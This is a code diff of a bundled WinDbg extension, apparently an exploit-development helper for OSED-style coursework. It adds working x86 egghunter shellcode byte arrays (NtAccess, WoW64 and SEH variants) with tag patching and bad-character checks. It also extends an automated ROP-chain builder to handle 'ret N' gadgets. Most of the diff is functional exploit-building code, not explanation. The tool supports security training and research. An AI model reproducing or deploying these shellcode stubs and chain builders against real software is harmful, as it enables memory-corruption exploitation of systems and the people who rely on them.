@@ -2016,62 +2016,284 @@ var osed_bundle = (() => {
   }
 
   // src/commands/egghunter.ts
-  var EGGHUNTERS = {
-    ntaccess_x86: [102, 129, 202, 255, 15, 66, 82, 106, 2, 88, 205, 46, 60, 5, 90, 116, 239, 184, 87, 48, 48, 84, 139, 250, 175, 117, 234, 175, 117, 231, 255, 231],
-    ntaccess_wow64: [102, 129, 202, 255, 15, 65, 106, 2, 88, 205, 46, 60, 5, 90, 116, 239, 184, 87, 48, 48, 84, 139, 250, 175, 117, 234, 175, 117, 231, 255, 231]
-  };
+  var NTACCESS_X86 = [
+    102,
+    129,
+    202,
+    255,
+    15,
+    // or dx, 0x0fff
+    66,
+    // inc edx
+    82,
+    // push edx
+    106,
+    2,
+    // push 0x2
+    88,
+    // pop eax
+    205,
+    46,
+    // int 0x2e
+    60,
+    5,
+    // cmp al, 0x5
+    90,
+    // pop edx
+    116,
+    239,
+    // je short (back to or dx)
+    184,
+    84,
+    48,
+    48,
+    87,
+    // mov eax, <TAG>
+    139,
+    250,
+    // mov edi, edx
+    175,
+    // scasd
+    117,
+    234,
+    // jne short (back to inc edx)
+    175,
+    // scasd
+    117,
+    231,
+    // jne short (back to inc edx)
+    255,
+    231
+    // jmp edi
+  ];
+  var NTACCESS_WOW64 = [
+    102,
+    129,
+    202,
+    255,
+    15,
+    65,
+    106,
+    2,
+    88,
+    205,
+    46,
+    60,
+    5,
+    90,
+    116,
+    239,
+    184,
+    84,
+    48,
+    48,
+    87,
+    139,
+    250,
+    175,
+    117,
+    234,
+    175,
+    117,
+    231,
+    255,
+    231
+  ];
+  var SEH_EGGHUNTER = [
+    // jmp short install_seh
+    235,
+    23,
+    // handler (offset 0x02, 23 bytes)
+    139,
+    76,
+    36,
+    12,
+    // mov ecx, [esp+0x0C]      (ContextRecord)
+    139,
+    68,
+    36,
+    8,
+    // mov eax, [esp+0x08]      (EstablisherFrame)
+    139,
+    64,
+    4,
+    // mov eax, [eax+0x04]      (handler address)
+    131,
+    192,
+    43,
+    // add eax, 0x2B            (scan_loop = handler+43)
+    137,
+    129,
+    184,
+    0,
+    0,
+    0,
+    // mov [ecx+0xB8], eax     (set Eip = scan_loop)
+    49,
+    192,
+    // xor eax, eax             (EXCEPTION_CONTINUE_EXECUTION)
+    195,
+    // ret
+    // install_seh (offset 0x19)
+    49,
+    210,
+    // xor edx, edx
+    232,
+    0,
+    0,
+    0,
+    0,
+    // call $+5
+    94,
+    // pop esi                  (esi = addr of this pop)
+    131,
+    238,
+    30,
+    // sub esi, 0x1E            (esi = handler addr)
+    86,
+    // push esi                 (handler)
+    100,
+    255,
+    50,
+    // push dword ptr fs:[edx]  (old SEH)
+    100,
+    137,
+    34,
+    // mov dword ptr fs:[edx], esp
+    49,
+    255,
+    // xor edi, edi             (scan from 0)
+    // scan_loop (offset 0x2D) — handler resumes here (next page)
+    102,
+    129,
+    207,
+    255,
+    15,
+    // or di, 0x0FFF
+    // next_addr (offset 0x32) — jnz resumes here (next dword)
+    71,
+    // inc edi
+    184,
+    84,
+    48,
+    48,
+    87,
+    // mov eax, <TAG>           (tag at offset 0x34)
+    175,
+    // scasd
+    117,
+    247,
+    // jnz next_addr            (0x32)
+    175,
+    // scasd
+    117,
+    244,
+    // jnz next_addr            (0x32)
+    // found — restore old SEH and jump
+    100,
+    143,
+    2,
+    // pop dword ptr fs:[edx]
+    131,
+    196,
+    4,
+    // add esp, 0x04
+    255,
+    231
+    // jmp edi
+  ];
+  var TAG_OFFSET_NTACCESS = 18;
+  var TAG_OFFSET_NTACCESS_WOW64 = 16;
+  var TAG_OFFSET_SEH = 52;
+  function uniqueBytes(values) {
+    const seen = /* @__PURE__ */ new Set();
+    for (const v of values != null ? values : []) {
+      if (Number.isInteger(v) && v >= 0 && v <= 255) seen.add(v & 255);
+    }
+    return [...seen].sort((a, b) => a - b);
+  }
+  function checkBadchars(bytes, label, badSet) {
+    const hits = [];
+    for (let i = 0; i < bytes.length; i++) {
+      if (badSet.has(bytes[i])) {
+        hits.push(`byte 0x${bytes[i].toString(16).toUpperCase().padStart(2, "0")} at offset ${i} in ${label}`);
+      }
+    }
+    return hits;
+  }
+  function tagBytes(tag) {
+    return tag.padEnd(4, "X").slice(0, 4).split("").map((c) => c.charCodeAt(0));
+  }
+  function buildEgghunter(options) {
+    const tag = tagBytes(options.tag);
+    const badSet = new Set(uniqueBytes(options.badchars));
+    let template;
+    let tagOffset;
+    let label;
+    if (options.mode === "seh") {
+      template = [...SEH_EGGHUNTER];
+      tagOffset = TAG_OFFSET_SEH;
+      label = "seh egghunter";
+    } else if (options.wow64) {
+      template = [...NTACCESS_WOW64];
+      tagOffset = TAG_OFFSET_NTACCESS_WOW64;
+      label = "ntaccess wow64 egghunter";
+    } else {
+      template = [...NTACCESS_X86];
+      tagOffset = TAG_OFFSET_NTACCESS;
+      label = "ntaccess egghunter";
+    }
+    template.splice(tagOffset, 4, ...tag);
+    const badcharHits2 = checkBadchars(template, label, badSet);
+    return { bytes: template, size: template.length, badcharHits: badcharHits2 };
+  }
   function bytesToHex(bytes) {
-    return bytes.map((value) => value.toString(16).toUpperCase().padStart(2, "0")).join("");
+    return bytes.map((v) => v.toString(16).toUpperCase().padStart(2, "0")).join("");
   }
   function bytesToPython(bytes) {
-    return `b"${bytes.map((value) => `\\x${value.toString(16).padStart(2, "0")}`).join("")}"`;
-  }
-  function build(options) {
-    if (options.mode === "seh") {
-      throw new Error(
-        'The SEH egghunter mode is not implemented. Use mode: "ntaccess" instead, which probes memory via the NtAccessCheckAndAuditAlarm syscall (INT 0x2E).'
-      );
-    }
-    const key2 = `${options.mode}_${options.wow64 ? "wow64" : "x86"}`;
-    const bytes = EGGHUNTERS[key2];
-    if (!bytes) {
-      throw new Error(`Unsupported egghunter mode: ${key2}`);
-    }
-    const hunter = [...bytes];
-    const tagBytes = options.tag.padEnd(4, "X").slice(0, 4).split("").map((char) => char.charCodeAt(0));
-    hunter.splice(18, 4, ...tagBytes);
-    return hunter;
+    return `b"${bytes.map((v) => `\\x${v.toString(16).padStart(2, "0")}`).join("")}"`;
   }
   function createEgghunterCommand() {
     return {
       name: "egghunter",
-      description: "Generate NtAccess/SEH egghunter stubs.",
-      usage: "dx @$osed().egghunter({ tag: 'W00T', mode: 'ntaccess', wow64: false })",
+      description: "Generate NtAccess/SEH egghunter stubs with badchar checking.",
+      usage: "dx @$osed().egghunter({ tag: 'W00T', mode: 'ntaccess', wow64: false, badchars: [0, 0x0a] })",
       examples: [
-        "dx @$osed().egghunter({ tag: 'W00T', mode: 'ntaccess', wow64: false })",
-        "dx @$osed().egghunter({ tag: 'B33F', mode: 'seh', wow64: true })"
+        "dx @$osed().egghunter({ tag: 'W00T' })",
+        "dx @$osed().egghunter({ tag: 'B33F', mode: 'seh' })",
+        "dx @$osed().egghunter({ tag: 'W00T', mode: 'ntaccess', wow64: true })",
+        "dx @$osed().egghunter({ tag: 'W00T', badchars: [0, 0x0a, 0x0d] })"
       ],
       schema: {
         tag: { type: "string", default: "W00T" },
         mode: { type: "string", enum: ["ntaccess", "seh"], default: "ntaccess" },
-        wow64: { type: "boolean", default: false }
+        wow64: { type: "boolean", default: false },
+        badchars: { type: "array", default: [] }
       },
       execute(options) {
-        const hunter = build(options);
+        var _a, _b, _c, _d;
+        const opts = {
+          tag: (_a = options.tag) != null ? _a : "W00T",
+          mode: (_b = options.mode) != null ? _b : "ntaccess",
+          wow64: (_c = options.wow64) != null ? _c : false,
+          badchars: (_d = options.badchars) != null ? _d : []
+        };
+        const result3 = buildEgghunter(opts);
         section("Egghunter");
-        info(`Tag: ${options.tag}`);
-        info(`Mode: ${options.mode}`);
-        info(`WoW64: ${options.wow64 ? "yes" : "no"}`);
-        info(`Size: ${hunter.length} bytes`);
-        print(bytesToHex(hunter));
-        print(bytesToPython(hunter));
-        whyItMatters("Egghunters shrink staged exploits and locate payloads in constrained buffers.");
+        info(`Tag: ${opts.tag} | Mode: ${opts.mode}${opts.wow64 ? " (WoW64)" : ""} | Size: ${result3.size} bytes`);
+        print(bytesToHex(result3.bytes));
+        print(bytesToPython(result3.bytes));
+        if (result3.badcharHits.length > 0) {
+          for (const hit of result3.badcharHits) {
+            warn(`Badchar: ${hit}`);
+          }
+        }
         return {
           command: "egghunter",
           args: options,
-          success: true,
-          findings: [{ bytes: hunter, size: hunter.length }],
-          warnings: [],
+          success: result3.badcharHits.length === 0,
+          findings: [result3],
+          warnings: result3.badcharHits,
           errors: []
         };
       }
@@ -2953,44 +3175,67 @@ var osed_bundle = (() => {
     const location = gadget.locations.find((entry) => entry.virtualAddress !== void 0);
     return (location == null ? void 0 : location.virtualAddress) !== void 0 ? BigInt(location.virtualAddress) : void 0;
   }
-  function isSinglePopRet(gadget, register) {
-    if (gadget.instructions.length !== 2) {
-      return false;
+  function retImmBytes(gadget) {
+    const last = gadget.instructions[gadget.instructions.length - 1];
+    if (!last || last.mnemonic !== "ret") return -1;
+    if (last.operands.length === 0) return 0;
+    const text = last.operands[0].trim();
+    const value = text.startsWith("0x") ? parseInt(text, 16) : parseInt(text, 10);
+    return Number.isFinite(value) && value >= 0 ? value : -1;
+  }
+  function retImmPadding(retImm) {
+    if (retImm <= 0) return [];
+    const padWords = retImm / 4;
+    const steps = [];
+    for (let i = 0; i < padWords; i++) {
+      steps.push({ kind: "value", value: 1094795585, comment: `padding (ret ${retImm} compensation)` });
     }
+    return steps;
+  }
+  function isSinglePopRetLike(gadget, register) {
+    if (gadget.instructions.length !== 2) return false;
     const [pop, ret] = gadget.instructions;
-    return pop.mnemonic === "pop" && pop.operands.length === 1 && pop.operands[0].trim().toLowerCase() === register && ret.mnemonic === "ret" && ret.operands.length === 0;
+    return pop.mnemonic === "pop" && pop.operands.length === 1 && pop.operands[0].trim().toLowerCase() === register && ret.mnemonic === "ret";
   }
   function selectPopGadget(index, register) {
-    return index.loadRegister(register).filter((gadget) => isSinglePopRet(gadget, register) && firstKnownAddress(gadget) !== void 0).sort((a, b) => b.score - a.score)[0];
+    const candidates2 = index.loadRegister(register).filter((g) => isSinglePopRetLike(g, register) && firstKnownAddress(g) !== void 0);
+    const plainRet = candidates2.filter((g) => retImmBytes(g) === 0).sort((a, b) => b.score - a.score)[0];
+    if (plainRet) return { gadget: plainRet, retImm: 0 };
+    const withImm = candidates2.filter((g) => retImmBytes(g) > 0).sort((a, b) => {
+      const diff = retImmBytes(a) - retImmBytes(b);
+      return diff !== 0 ? diff : b.score - a.score;
+    })[0];
+    if (withImm) return { gadget: withImm, retImm: retImmBytes(withImm) };
+    return void 0;
   }
-  function isZeroRet(gadget, register) {
-    if (gadget.instructions.length !== 2) {
-      return false;
-    }
+  function isZeroRetLike(gadget, register) {
+    if (gadget.instructions.length !== 2) return false;
     const [xor, ret] = gadget.instructions;
-    return xor.mnemonic === "xor" && xor.operands.length === 2 && xor.operands[0].trim().toLowerCase() === register && xor.operands[1].trim().toLowerCase() === register && ret.mnemonic === "ret" && ret.operands.length === 0;
+    return xor.mnemonic === "xor" && xor.operands.length === 2 && xor.operands[0].trim().toLowerCase() === register && xor.operands[1].trim().toLowerCase() === register && ret.mnemonic === "ret";
   }
   function selectZeroGadget(index, register) {
-    return index.zeroRegister(register).filter((gadget) => isZeroRet(gadget, register) && firstKnownAddress(gadget) !== void 0).sort((a, b) => b.score - a.score)[0];
+    const candidates2 = index.zeroRegister(register).filter((g) => isZeroRetLike(g, register) && firstKnownAddress(g) !== void 0);
+    const plainRet = candidates2.filter((g) => retImmBytes(g) === 0).sort((a, b) => b.score - a.score)[0];
+    if (plainRet) return { gadget: plainRet, retImm: 0 };
+    const withImm = candidates2.filter((g) => retImmBytes(g) > 0).sort((a, b) => {
+      const diff = retImmBytes(a) - retImmBytes(b);
+      return diff !== 0 ? diff : b.score - a.score;
+    })[0];
+    if (withImm) return { gadget: withImm, retImm: retImmBytes(withImm) };
+    return void 0;
   }
-  function popSequenceRegisters(gadget) {
+  function popSequenceInfo(gadget) {
     const instructions = gadget.instructions;
-    if (instructions.length < 2) {
-      return void 0;
-    }
-    const ret = instructions[instructions.length - 1];
-    if (ret.mnemonic !== "ret" || ret.operands.length !== 0) {
-      return void 0;
-    }
+    if (instructions.length < 2) return void 0;
+    const imm = retImmBytes(gadget);
+    if (imm < 0) return void 0;
     const registers = [];
     for (let index = 0; index < instructions.length - 1; index += 1) {
       const step = instructions[index];
-      if (step.mnemonic !== "pop" || step.operands.length !== 1) {
-        return void 0;
-      }
+      if (step.mnemonic !== "pop" || step.operands.length !== 1) return void 0;
       registers.push(step.operands[0].trim().toLowerCase());
     }
-    return registers;
+    return { registers, retImm: imm };
   }
   function valueComment(register, value) {
     return `${register} = 0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
@@ -3012,36 +3257,40 @@ var osed_bundle = (() => {
       if (remaining.get(register) !== 0) {
         continue;
       }
-      const gadget = selectZeroGadget(index, register);
-      if (gadget) {
-        steps.push({ kind: "gadget", address: firstKnownAddress(gadget), comment: `xor ${register}, ${register} ; ret (${register} = 0)` });
+      const selection = selectZeroGadget(index, register);
+      if (selection) {
+        const retSuffix = selection.retImm > 0 ? ` ${selection.retImm}` : "";
+        steps.push({ kind: "gadget", address: firstKnownAddress(selection.gadget), comment: `xor ${register}, ${register} ; ret${retSuffix} (${register} = 0)` });
+        steps.push(...retImmPadding(selection.retImm));
         satisfied.push(register);
         remaining.delete(register);
       }
     }
-    const popSequences = index.gadgets.map((gadget) => ({ gadget, registers: popSequenceRegisters(gadget) })).filter((entry) => entry.registers !== void 0 && entry.registers.length >= 2 && firstKnownAddress(entry.gadget) !== void 0);
+    const popSequences = index.gadgets.map((gadget) => ({ gadget, info: popSequenceInfo(gadget) })).filter((entry) => entry.info !== void 0 && entry.info.registers.length >= 2 && firstKnownAddress(entry.gadget) !== void 0);
     let progressed = true;
     while (progressed) {
       progressed = false;
       let best;
       for (const candidate of popSequences) {
-        const { registers } = candidate;
+        const { registers } = candidate.info;
         const distinct = new Set(registers).size === registers.length;
         if (!distinct || !registers.every((register) => remaining.has(register))) {
           continue;
         }
-        if (!best || registers.length > best.registers.length || registers.length === best.registers.length && candidate.gadget.score > best.gadget.score) {
+        if (!best || candidate.info.retImm < best.info.retImm || candidate.info.retImm === best.info.retImm && registers.length > best.info.registers.length || candidate.info.retImm === best.info.retImm && registers.length === best.info.registers.length && candidate.gadget.score > best.gadget.score) {
           best = candidate;
         }
       }
       if (best) {
-        steps.push({ kind: "gadget", address: firstKnownAddress(best.gadget), comment: `${best.registers.map((register) => `pop ${register}`).join(" ; ")} ; ret` });
-        for (const register of best.registers) {
+        const retSuffix = best.info.retImm > 0 ? ` ${best.info.retImm}` : "";
+        steps.push({ kind: "gadget", address: firstKnownAddress(best.gadget), comment: `${best.info.registers.map((register) => `pop ${register}`).join(" ; ")} ; ret${retSuffix}` });
+        for (const register of best.info.registers) {
           const value = remaining.get(register) >>> 0;
           steps.push({ kind: "value", value, comment: valueComment(register, value) });
           satisfied.push(register);
           remaining.delete(register);
         }
+        steps.push(...retImmPadding(best.info.retImm));
         progressed = true;
       }
     }
@@ -3049,16 +3298,18 @@ var osed_bundle = (() => {
       if (!remaining.has(register)) {
         continue;
       }
-      const gadget = selectPopGadget(index, register);
-      if (!gadget) {
+      const selection = selectPopGadget(index, register);
+      if (!selection) {
         const reason = index.loadRegister(register).length > 0 ? "only multi-pop or address-less load gadgets available" : "no pop gadget found for register";
         unsatisfied.push({ register, reason });
         remaining.delete(register);
         continue;
       }
       const value = remaining.get(register) >>> 0;
-      steps.push({ kind: "gadget", address: firstKnownAddress(gadget), comment: `pop ${register} ; ret` });
+      const retSuffix = selection.retImm > 0 ? ` ${selection.retImm}` : "";
+      steps.push({ kind: "gadget", address: firstKnownAddress(selection.gadget), comment: `pop ${register} ; ret${retSuffix}` });
       steps.push({ kind: "value", value, comment: valueComment(register, value) });
+      steps.push(...retImmPadding(selection.retImm));
       satisfied.push(register);
       remaining.delete(register);
     }
@@ -3077,7 +3328,7 @@ var osed_bundle = (() => {
     }
     return lines;
   }
-  function uniqueBytes(values) {
+  function uniqueBytes2(values) {
     const seen = /* @__PURE__ */ new Set();
     for (const value of values != null ? values : []) {
       if (Number.isInteger(value) && value >= 0 && value <= 255) {
@@ -3105,7 +3356,7 @@ var osed_bundle = (() => {
     return bytes.map((byte) => `0x${byte.toString(16).toUpperCase().padStart(2, "0")}`).join(", ");
   }
   function planFlatStdcallFrame(entries, badchars) {
-    const normalizedBadchars = uniqueBytes(badchars);
+    const normalizedBadchars = uniqueBytes2(badchars);
     const placeholders = /* @__PURE__ */ new Set();
     const badcharViolations = [];
     const warnings = [];
@@ -3194,19 +3445,21 @@ var osed_bundle = (() => {
         unsatisfied.push({ register: spec.register, reason: spec.missingReason });
         continue;
       }
-      const gadget = selectPopGadget(index, spec.register);
-      if (!gadget) {
+      const selection = selectPopGadget(index, spec.register);
+      if (!selection) {
         const reason = index.loadRegister(spec.register).length > 0 ? "only multi-pop or address-less load gadgets available" : "no pop gadget found for register";
         unsatisfied.push({ register: spec.register, reason });
         continue;
       }
-      steps.push({ kind: "gadget", address: firstKnownAddress(gadget), comment: `pop ${spec.register} ; ret` });
+      const retSuffix = selection.retImm > 0 ? ` ${selection.retImm}` : "";
+      steps.push({ kind: "gadget", address: firstKnownAddress(selection.gadget), comment: `pop ${spec.register} ; ret${retSuffix}` });
       if (spec.placeholder) {
         placeholders.add(spec.placeholder);
         steps.push({ kind: "value", placeholder: spec.placeholder, comment: `${spec.register} = ${spec.placeholder} (${spec.meaning})` });
       } else {
         steps.push({ kind: "value", value: spec.value >>> 0, comment: `${spec.register} = ${hex32(spec.value)} (${spec.meaning})` });
       }
+      steps.push(...retImmPadding(selection.retImm));
       satisfied.push(spec.register);
     }
     const pushad = findPushadRet(index);
@@ -8478,8 +8731,8 @@ var osed_bundle = (() => {
     return {
       name: "osed-windbg",
       version: "1.0.4",
-      buildTime: "2026-07-23T04:09:42.583Z",
-      gitCommit: "565280549c62",
+      buildTime: "2026-07-23T12:34:26.397Z",
+      gitCommit: "7b4f5250d285",
       gitDirty: true
     };
   }
